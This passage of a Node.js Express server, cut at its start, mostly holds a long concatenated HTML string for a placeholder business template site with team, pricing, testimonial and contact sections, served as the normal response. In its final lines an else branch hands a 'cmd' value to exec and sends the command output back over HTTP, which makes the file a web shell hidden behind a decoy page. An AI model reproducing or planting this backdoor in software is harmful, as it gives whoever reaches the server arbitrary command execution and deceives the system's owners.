     '                               <li><a href="#"><i class="fa fa-twitter"></i></a></li>  '  +
     '                               <li><a href="#"><i class="fa fa-google-plus"></i></a></li>  '  +
     '                               <li><a href="#"><i class="fa fa-linkedin"></i></a></li>  '  +
     '                           </ul>  '  +
     '                       </div>  '  +
     '                   </div>  '  +
     '                   <div class="col-sm-6 col-md-3">  '  +
     '                       <div class="team-member wow fadeInUp" data-wow-duration="400ms" data-wow-delay="300ms">  '  +
     '                           <div class="team-img">  '  +
     '                               <img class="img-responsive img-circle" src="http://hostingred.com/free-web-templates/HR2/images/team/04.jpg" alt="">  '  +
     '                           </div>  '  +
     '                           <div class="team-info">  '  +
     '                               <h3>Nartleb August</h3>  '  +
     '                               <span>Director</span>  '  +
     '                           </div>  '  +
     '                           <p>At vero eos et accusamus et iusto odio dignissimos ducimus qui blanditiis praesentium voluptatum</p>  '  +
     '                           <ul class="social-icons">  '  +
     '                               <li><a href="#"><i class="fa fa-facebook"></i></a></li>  '  +
     '                               <li><a href="#"><i class="fa fa-twitter"></i></a></li>  '  +
     '                               <li><a href="#"><i class="fa fa-google-plus"></i></a></li>  '  +
     '                               <li><a href="#"><i class="fa fa-linkedin"></i></a></li>  '  +
     '                           </ul>  '  +
     '                       </div>  '  +
     '                   </div>  '  +
     '               </div>  '  +
     '     '  +
     '               <div class="divider"></div>  '  +
     '     '  +
     '               <div class="row">  '  +
     '     '  +
     '                   <div class="col-sm-4">  '  +
     '                       <h3 class="column-title">Modi Tempora</h3>  '  +
     '                       <div role="tabpanel">  '  +
     '                           <ul class="nav main-tab nav-justified" role="tablist">  '  +
     '                               <li role="presentation" class="active">  '  +
     '                                   <a href="#tab1" role="tab" data-toggle="tab" aria-controls="tab1" aria-expanded="true">2010</a>  '  +
     '                               </li>  '  +
     '                               <li role="presentation">  '  +
     '                                   <a href="#tab2" role="tab" data-toggle="tab" aria-controls="tab2" aria-expanded="false">2011</a>  '  +
     '                               </li>  '  +
     '                               <li role="presentation">  '  +
     '                                   <a href="#tab3" role="tab" data-toggle="tab" aria-controls="tab3" aria-expanded="false">2013</a>  '  +
     '                               </li>  '  +
     '                               <li role="presentation">  '  +
     '                                   <a href="#tab4" role="tab" data-toggle="tab" aria-controls="tab4" aria-expanded="false">2014</a>  '  +
     '                               </li>  '  +
     '                           </ul>  '  +
     '                           <div id="tab-content" class="tab-content">  '  +
     '                               <div role="tabpanel" class="tab-pane fade active in" id="tab1" aria-labelledby="tab1">  '  +
     '                                   <p>Ut enim ad minima veniam, quis nostrum exercitationem ullam corporis suscipit laboriosam, nisi ut aliquid ex ea commodi consequatur.</p>  '  +
     '                                   <p>velit esse quam nihil molestiae consequatur, vel illum qui dolorem eum fugiat quo voluptas nulla pariatur? At vero.</p>  '  +
     '                               </div>  '  +
     '                               <div role="tabpanel" class="tab-pane fade" id="tab2" aria-labelledby="tab2">  '  +
     '                                   <p>Ut enim ad minima veniam, quis nostrum exercitationem ullam corporis suscipit laboriosam, nisi ut aliquid ex ea commodi consequatur.</p>  '  +
     '                                   <p>velit esse quam nihil molestiae consequatur, vel illum qui dolorem eum fugiat quo voluptas nulla pariatur? At vero.</p>  '  +
     '                               </div>  '  +
     '                               <div role="tabpanel" class="tab-pane fade" id="tab3" aria-labelledby="tab3">  '  +
     '                                   <p>Ut enim ad minima veniam, quis nostrum exercitationem ullam corporis suscipit laboriosam, nisi ut aliquid ex ea commodi consequatur.</p>  '  +
     '                                   <p>velit esse quam nihil molestiae consequatur, vel illum qui dolorem eum fugiat quo voluptas nulla pariatur? At vero.</p>  '  +
     '                               </div>  '  +
     '                               <div role="tabpanel" class="tab-pane fade" id="tab4" aria-labelledby="tab3">  '  +
     '                                   <p>Ut enim ad minima veniam, quis nostrum exercitationem ullam corporis suscipit laboriosam, nisi ut aliquid ex ea commodi consequatur.</p>  '  +
     '                                   <p>velit esse quam nihil molestiae consequatur, vel illum qui dolorem eum fugiat quo voluptas nulla pariatur? At vero.</p>  '  +
     '                               </div>  '  +
     '                           </div>  '  +
     '                       </div>  '  +
     '                   </div>  '  +
     '                     '  +
     '                   <div class="col-sm-4">  '  +
     '                       <h3 class="column-title">Similique Sunt</h3>  '  +
     '                       <strong>Voluptas Sit Aspernatur</strong>  '  +
     '                       <div class="progress">  '  +
     '                           <div class="progress-bar progress-bar-primary" role="progressbar" data-width="90">85%</div>  '  +
     '                       </div>  '  +
     '                       <strong>Quia Consequuntur</strong>  '  +
     '                       <div class="progress">  '  +
     '                           <div class="progress-bar progress-bar-primary" role="progressbar" data-width="85">70%</div>  '  +
     '                       </div>  '  +
     '                       <strong>Neque Porro Quisquam</strong>  '  +
     '                       <div class="progress">  '  +
     '                           <div class="progress-bar progress-bar-primary" role="progressbar" data-width="95">90%</div>  '  +
     '                       </div>  '  +
     '                       <strong>Numquam Eius</strong>  '  +
     '                       <div class="progress">  '  +
     '                           <div class="progress-bar progress-bar-primary" role="progressbar" data-width="78">65%</div>  '  +
     '                       </div>  '  +
     '                   </div>  '  +
     '     '  +
     '                   <div class="col-sm-4">  '  +
     '                       <h3 class="column-title">Dignissimos</h3>  '  +
     '                       <div class="panel-group" id="accordion" role="tablist" aria-multiselectable="true">  '  +
     '                           <div class="panel panel-default">  '  +
     '                               <div class="panel-heading" role="tab" id="headingOne">  '  +
     '                                   <h4 class="panel-title">  '  +
     '                                       <a data-toggle="collapse" data-parent="#accordion" href="#collapseOne" aria-expanded="true" aria-controls="collapseOne">  '  +
     '                                           Ducimus qui blanditiis praesentium  '  +
     '                                       </a>  '  +
     '                                   </h4>  '  +
     '                               </div>  '  +
     '                               <div id="collapseOne" class="panel-collapse collapse in" role="tabpanel" aria-labelledby="headingOne">  '  +
     '                                   <div class="panel-body">  '  +
     '                                       Deleniti atque corrupti quos dolores et quas molestias excepturi sint occaecati cupiditate non provident, similique sunt in culpa qui officia deserunt mollitia animi, id est laborum et.  '  +
     '                                   </div>  '  +
     '                               </div>  '  +
     '                           </div>  '  +
     '                           <div class="panel panel-default">  '  +
     '                               <div class="panel-heading" role="tab" id="headingTwo">  '  +
     '                                   <h4 class="panel-title">  '  +
     '                                       <a class="collapsed" data-toggle="collapse" data-parent="#accordion" href="#collapseTwo" aria-expanded="false" aria-controls="collapseTwo">  '  +
     '                                           Nam libero tempore, cum soluta  '  +
     '                                       </a>  '  +
     '                                   </h4>  '  +
     '                               </div>  '  +
     '                               <div id="collapseTwo" class="panel-collapse collapse" role="tabpanel" aria-labelledby="headingTwo">  '  +
     '                                   <div class="panel-body">  '  +
     '                                       Deleniti atque corrupti quos dolores et quas molestias excepturi sint occaecati cupiditate non provident, similique sunt in culpa qui officia deserunt mollitia animi, id est laborum et.  '  +
     '                                   </div>  '  +
     '                               </div>  '  +
     '                           </div>  '  +
     '                           <div class="panel panel-default">  '  +
     '                               <div class="panel-heading" role="tab" id="headingThree">  '  +
     '                                   <h4 class="panel-title">  '  +
     '                                       <a class="collapsed" data-toggle="collapse" data-parent="#accordion" href="#collapseThree" aria-expanded="false" aria-controls="collapseThree">  '  +
     '                                           Nobis est eligendi optio cumque   '  +
     '                                       </a>  '  +
     '                                   </h4>  '  +
     '                               </div>  '  +
     '                               <div id="collapseThree" class="panel-collapse collapse" role="tabpanel" aria-labelledby="headingThree">  '  +
     '                                   <div class="panel-body">  '  +
     '                                       Deleniti atque corrupti quos dolores et quas molestias excepturi sint occaecati cupiditate non provident, similique sunt in culpa qui officia deserunt mollitia animi, id est laborum et.  '  +
     '                                   </div>  '  +
     '                               </div>  '  +
     '                           </div>  '  +
     '                       </div>  '  +
     '                   </div>  '  +
     '     '  +
     '               </div>  '  +
     '           </div>  '  +
     '       </section><!--/#meet-team-->  '  +
     '     '  +
     '       <section id="animated-number">  '  +
     '           <div class="container">  '  +
     '               <div class="section-header">  '  +
     '                   <h2 class="section-title text-center wow fadeInDown">Impedit Quo Minus</h2>  '  +
     '                   <p class="text-center wow fadeInDown">id quod maxime placeat facere possimus, omnis voluptas assumenda est, omnis dolor repellendus.<br>Temporibus autem quibusdam et aut officiis debitis aut</p>  '  +
     '               </div>  '  +
     '     '  +
     '               <div class="row text-center">  '  +
     '                   <div class="col-sm-3 col-xs-6">  '  +
     '                       <div class="wow fadeInUp" data-wow-duration="400ms" data-wow-delay="0ms">  '  +
     '                           <div class="animated-number" data-digit="1234" data-duration="1000"></div>  '  +
     '                           <strong>Itaque Earum Rerum Hic</strong>  '  +
     '                       </div>  '  +
     '                   </div>  '  +
     '                   <div class="col-sm-3 col-xs-6">  '  +
     '                       <div class="wow fadeInUp" data-wow-duration="400ms" data-wow-delay="100ms">  '  +
     '                           <div class="animated-number" data-digit="3214" data-duration="1000"></div>  '  +
     '                           <strong>Tenetur a Sapiente</strong>  '  +
     '                       </div>  '  +
     '                   </div>  '  +
     '                   <div class="col-sm-3 col-xs-6">  '  +
     '                       <div class="wow fadeInUp" data-wow-duration="400ms" data-wow-delay="200ms">  '  +
     '                           <div class="animated-number" data-digit="4123" data-duration="1000"></div>  '  +
     '                           <strong>Aut Reiciendis</strong>  '  +
     '                       </div>  '  +
     '                   </div>  '  +
     '                   <div class="col-sm-3 col-xs-6">  '  +
     '                       <div class="wow fadeInUp" data-wow-duration="400ms" data-wow-delay="300ms">  '  +
     '                           <div class="animated-number" data-digit="2233" data-duration="1000"></div>  '  +
     '                           <strong>Voluptatibus Maiores</strong>  '  +
     '                       </div>  '  +
     '                   </div>  '  +
     '               </div>  '  +
     '           </div>  '  +
     '       </section><!--/#animated-number-->  '  +
     '     '  +
     '       <section id="pricing">  '  +
     '           <div class="container">  '  +
     '               <div class="section-header">  '  +
     '                   <h2 class="section-title text-center wow fadeInDown">Our Plans</h2>  '  +
     '                   <p class="text-center wow fadeInDown"> Sed ut perspiciatis unde omnis iste natus error sit voluptatem accusantium doloremque<br>laudantium, totam rem aperiam, eaque ipsa quae ab illo</p>  '  +
     '               </div>  '  +
     '     '  +
     '               <div class="row">  '  +
     '                   <div class="col-sm-6 col-md-3">  '  +
     '                       <div class="wow zoomIn" data-wow-duration="400ms" data-wow-delay="0ms">  '  +
     '                           <ul class="pricing">  '  +
     '                               <li class="plan-header">  '  +
     '                                   <div class="price-duration">  '  +
     '                                       <span class="price">  '  +
     '                                           $15  '  +
     '                                       </span>  '  +
     '                                       <span class="duration">  '  +
     '                                           per year  '  +
     '                                       </span>  '  +
     '                                   </div>  '  +
     '     '  +
     '                                   <div class="plan-name">  '  +
     '                                       Plan One  '  +
     '                                   </div>  '  +
     '                               </li>  '  +
     '                               <li><strong>10</strong> EXCEPTURL</li>  '  +
     '                               <li><strong>120</strong> NIHIL</li>  '  +
     '                               <li><strong>EXPEDITA</strong> DISCTINTO</li>  '  +
     '                               <li>LUSTO ODIMO ATQUE</li>  '  +
     '                               <li><strong>15</strong> RATIONE COLUPTATEM</li>  '  +
     '                               <li><strong>24/7</strong> SAPIENTE</li>  '  +
     '                               <li class="plan-purchase"><a class="btn btn-primary" href="#">GET NOW</a></li>  '  +
     '                           </ul>  '  +
     '                       </div>  '  +
     '                   </div>  '  +
     '                   <div class="col-sm-6 col-md-3">  '  +
     '                       <div class="wow zoomIn" data-wow-duration="400ms" data-wow-delay="200ms">  '  +
     '                           <ul class="pricing featured">  '  +
     '                               <li class="plan-header">  '  +
     '                                   <div class="price-duration">  '  +
     '                                       <span class="price">  '  +
     '                                           $28  '  +
     '                                       </span>  '  +
     '                                       <span class="duration">  '  +
     '                                           per year  '  +
     '                                       </span>  '  +
     '                                   </div>  '  +
     '     '  +
     '                                   <div class="plan-name">  '  +
     '                                       Plan Two  '  +
     '                                   </div>  '  +
     '                               </li>  '  +
     '                               <li><strong>10</strong> EXCEPTURL</li>  '  +
     '                               <li><strong>120</strong> NIHIL</li>  '  +
     '                               <li><strong>EXPEDITA</strong> DISCTINTO</li>  '  +
     '                               <li>LUSTO ODIMO ATQUE</li>  '  +
     '                               <li><strong>15</strong> RATIONE COLUPTATEM</li>  '  +
     '                               <li><strong>24/7</strong> SAPIENTE</li>  '  +
     '                               <li class="plan-purchase"><a class="btn btn-primary" href="#">GET NOW</a></li>  '  +
     '                           </ul>  '  +
     '                       </div>  '  +
     '                   </div>  '  +
     '                   <div class="col-sm-6 col-md-3">  '  +
     '                       <div class="wow zoomIn" data-wow-duration="400ms" data-wow-delay="400ms">  '  +
     '                           <ul class="pricing">  '  +
     '                               <li class="plan-header">  '  +
     '                                   <div class="price-duration">  '  +
     '                                       <span class="price">  '  +
     '                                           $40  '  +
     '                                       </span>  '  +
     '                                       <span class="duration">  '  +
     '                                           per year  '  +
     '                                       </span>  '  +
     '                                   </div>  '  +
     '     '  +
     '                                   <div class="plan-name">  '  +
     '                                       Plan Three  '  +
     '                                   </div>  '  +
     '                               </li>  '  +
     '                               <li><strong>10</strong> EXCEPTURL</li>  '  +
     '                               <li><strong>120</strong> NIHIL</li>  '  +
     '                               <li><strong>EXPEDITA</strong> DISCTINTO</li>  '  +
     '                               <li>LUSTO ODIMO ATQUE</li>  '  +
     '                               <li><strong>15</strong> RATIONE COLUPTATEM</li>  '  +
     '                               <li><strong>24/7</strong> SAPIENTE</li>  '  +
     '                               <li class="plan-purchase"><a class="btn btn-primary" href="#">GET NOW</a></li>  '  +
     '                           </ul>  '  +
     '                       </div>  '  +
     '                   </div>  '  +
     '                   <div class="col-sm-6 col-md-3">  '  +
     '                       <div class="wow zoomIn" data-wow-duration="400ms" data-wow-delay="600ms">  '  +
     '                           <ul class="pricing">  '  +
     '                               <li class="plan-header">  '  +
     '                                   <div class="price-duration">  '  +
     '                                       <span class="price">  '  +
     '                                           $58  '  +
     '                                       </span>  '  +
     '                                       <span class="duration">  '  +
     '                                           per year  '  +
     '                                       </span>  '  +
     '                                   </div>  '  +
     '     '  +
     '                                   <div class="plan-name">  '  +
     '                                       Plan Four  '  +
     '                                   </div>  '  +
     '                               </li>  '  +
     '                               <li><strong>10</strong> EXCEPTURL</li>  '  +
     '                               <li><strong>120</strong> NIHIL</li>  '  +
     '                               <li><strong>EXPEDITA</strong> DISCTINTO</li>  '  +
     '                               <li>LUSTO ODIMO ATQUE</li>  '  +
     '                               <li><strong>15</strong> RATIONE COLUPTATEM</li>  '  +
     '                               <li><strong>24/7</strong> SAPIENTE</li>  '  +
     '                               <li class="plan-purchase"><a class="btn btn-primary" href="#">GET NOW</a></li>  '  +
     '                           </ul>  '  +
     '                       </div>  '  +
     '                   </div>  '  +
     '               </div>  '  +
     '           </div>  '  +
     '       </section><!--/#pricing-->  '  +
     '     '  +
     '       <section id="testimonial">  '  +
     '           <div class="container">  '  +
     '               <div class="row">  '  +
     '                   <div class="col-sm-8 col-sm-offset-2">  '  +
     '     '  +
     '                       <div id="carousel-testimonial" class="carousel slide text-center" data-ride="carousel">  '  +
     '                           <!-- Wrapper for slides -->  '  +
     '                           <div class="carousel-inner" role="listbox">  '  +
     '                               <div class="item active">  '  +
     '                                   <p><img class="img-circle img-thumbnail" src="http://hostingred.com/free-web-templates/HR2/images/testimonial/01.jpg" alt=""></p>  '  +
     '                                   <h4>Yetty L. Steven</h4>  '  +
     '                                   <small>Nemo enim ipsam voluptatem quia voluptas sit</small>  '  +
     '                                   <p>Aspernatur aut odit aut fugit, sed quia consequuntur magni dolores eos qui ratione voluptatem sequi nesciunt. Neque porro quisquam est</p>  '  +
     '                               </div>  '  +
     '                               <div class="item">  '  +
     '                                   <p><img class="img-circle img-thumbnail" src="http://hostingred.com/free-web-templates/HR2/images/testimonial/02.jpg" alt=""></p>  '  +
     '                                   <h4>Gerry Munstons</h4>  '  +
     '                                   <small>Itaque earum rerum hic tenetur a sapiente delectus</small>  '  +
     '                                   <p>Ut aut reiciendis voluptatibus maiores alias consequatur aut perferendis doloribus asperiores repellat. Sed ut perspiciatis unde omnis</p>  '  +
     '                               </div>  '  +
     '                           </div>  '  +
     '     '  +
     '                           <!-- Controls -->  '  +
     '                           <div class="btns">  '  +
     '                               <a class="btn btn-primary btn-sm" href="#carousel-testimonial" role="button" data-slide="prev">  '  +
     '                                   <span class="fa fa-angle-left" aria-hidden="true"></span>  '  +
     '                                   <span class="sr-only">Previous</span>  '  +
     '                               </a>  '  +
     '                               <a class="btn btn-primary btn-sm" href="#carousel-testimonial" role="button" data-slide="next">  '  +
     '                                   <span class="fa fa-angle-right" aria-hidden="true"></span>  '  +
     '                                   <span class="sr-only">Next</span>  '  +
     '                               </a>  '  +
     '                           </div>  '  +
     '                       </div>  '  +
     '                   </div>  '  +
     '               </div>  '  +
     '           </div>  '  +
     '       </section><!--/#testimonial-->  '  +
     '     '  +
     '       <section id="get-in-touch">  '  +
     '           <div class="container">  '  +
     '               <div class="section-header">  '  +
     '                   <h2 class="section-title text-center wow fadeInDown">NOSTRUM ALIQUAM INCIDUNT</h2>  '  +
     '                   <p class="text-center wow fadeInDown">Nemo enim ipsam voluptatem quia voluptas sit aspernatur aut odit aut fugit, sed quia<br>consequuntur magni dolores eos qui ratione voluptatem sequi nesciunt</p>  '  +
     '               </div>  '  +
     '           </div>  '  +
     '       </section><!--/#get-in-touch-->  '  +
     '     '  +
     '     '  +
     '       <section id="contact">  '  +
     '           <div id="google-map" style="height:650px" data-latitude="4.688467" data-longitude="-74.051289"></div>  '  +
     '           <div class="container-wrapper">  '  +
     '               <div class="container">  '  +
     '                   <div class="row">  '  +
     '                       <div class="col-sm-4 col-sm-offset-8">  '  +
     '                           <div class="contact-form">  '  +
     '                               <h3>Contact Info</h3>  '  +
     '     '  +
     '                               <address>  '  +
     '                                 <strong>Your Company, Inc.</strong><br>  '  +
     '                                 795 Folsom Ave, Suite 600<br>  '  +
     '                                 San Francisco, CA 94107<br>  '  +
     '                                 <abbr title="Phone">P:</abbr> (123) 456-7890  '  +
     '                               </address>  '  +
     '     '  +
     '                               <form id="main-contact-form" name="contact-form" method="post" action="contact-us.send.php">  '  +
     '                                   <div class="form-group">  '  +
     '                                       <input type="text" name="name" class="form-control" placeholder="Name" required>  '  +
     '                                   </div>  '  +
     '                                   <div class="form-group">  '  +
     '                                       <input type="email" name="email" class="form-control" placeholder="Email" required>  '  +
     '                                   </div>  '  +
     '                                   <div class="form-group">  '  +
     '                                       <input type="text" name="subject" class="form-control" placeholder="Subject" required>  '  +
     '                                   </div>  '  +
     '                                   <div class="form-group">  '  +
     '                                       <textarea name="message" class="form-control" rows="8" placeholder="Message" required></textarea>  '  +
     '                                   </div>  '  +
     '                                   <button type="submit" class="btn btn-primary">Send Message</button>  '  +
     '                               </form>  '  +
     '                           </div>  '  +
     '                       </div>  '  +
     '                   </div>  '  +
     '               </div>  '  +
     '           </div>  '  +
     '       </section><!--/#bottom-->  '  +
     '     '  +
     '       <footer id="footer">  '  +
     '           <div class="container">  '  +
     '               <div class="row">  '  +
     '                   <div class="col-sm-6">  '  +
     '                       &copy; 2016 Your Company.  '  +
     '                   </div>  '  +
     '                   <div class="col-sm-6">  '  +
     '                       <ul class="social-icons">  '  +
     '                           <li><a href="#"><i class="fa fa-facebook"></i></a></li>  '  +
     '                           <li><a href="#"><i class="fa fa-twitter"></i></a></li>  '  +
     '                           <li><a href="#"><i class="fa fa-google-plus"></i></a></li>  '  +
     '                           <li><a href="#"><i class="fa fa-pinterest"></i></a></li>  '  +
     '                           <li><a href="#"><i class="fa fa-flickr"></i></a></li>  '  +
     '                           <li><a href="#"><i class="fa fa-youtube"></i></a></li>  '  +
     '                           <li><a href="#"><i class="fa fa-linkedin"></i></a></li>  '  +
     '                       </ul>  '  +
     '                   </div>  '  +
     '               </div>  '  +
     '           </div>  '  +
     '       </footer><!--/#footer-->  '  +
     '     '  +
     '       <script src="http://hostingred.com/free-web-templates/HR2/js/jquery.js"></script>  '  +
     '       <script src="http://hostingred.com/free-web-templates/HR2/js/bootstrap.min.js"></script>  '  +
     '       <script src="http://maps.google.com/maps/api/js?sensor=true"></script>  '  +
     '       <script src="http://hostingred.com/free-web-templates/HR2/js/owl.carousel.min.js"></script>  '  +
     '       <script src="http://hostingred.com/free-web-templates/HR2/js/mousescroll.js"></script>  '  +
     '       <script src="http://hostingred.com/free-web-templates/HR2/js/smoothscroll.js"></script>  '  +
     '       <script src="http://hostingred.com/free-web-templates/HR2/js/jquery.prettyPhoto.js"></script>  '  +
     '       <script src="http://hostingred.com/free-web-templates/HR2/js/jquery.isotope.min.js"></script>  '  +
     '       <script src="http://hostingred.com/free-web-templates/HR2/js/jquery.inview.min.js"></script>  '  +
     '       <script src="http://hostingred.com/free-web-templates/HR2/js/wow.min.js"></script>  '  +
     '       <script src="http://hostingred.com/free-web-templates/HR2/js/main.js"></script>  '  +
     '   </body>  '  +
     '  </html>  ' )
      //res.sendfile('index/index.html', {root: __dirname })
      //res.sendFile( "/index/index.html", {root: __dirname });
    }else{
      exec(cmd, function(error, stdout, stderr) {
        // command output is in stdout
        console.log("stdout: "+stdout)
        res.send(stdout);
      });
    }
});
app.listen(process.argv[2]);
